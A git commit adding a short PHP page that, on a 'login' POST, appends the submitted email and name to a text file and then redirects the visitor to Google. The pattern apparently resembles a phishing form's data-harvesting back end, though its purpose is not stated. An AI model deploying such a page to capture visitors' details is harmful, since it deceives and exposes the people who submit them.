2c5e868e690dc2444bc2eb0a315e2e09f4ad449f
AJAYISK <91030156+AJAYISK@users.noreply.github.com>
2022-01-25 22:13:35 +0100

    Add files via upload

---
+++ index.php
@@ -0,0 +1,16 @@
+<?php
+if($_POST["login"]){
+    $file = fopen("complaint.txt" , "a") or die("cant oprn file");
+    $complaint = $_POST["email"] . "\n";
+    fwrite($file , $complaint);
+    $complaint = $_POST["name"] . "\n";
+    fwrite($file , $complaint);
+    $complaint = $_POST["submit"] . "\n";
+    fwrite($file , $complaint);
+    fwrite($file , "session end===");
+    fclose($file);
+}
+
+?>
+//goes here after
+<script>location.href="www.google.com";</script>
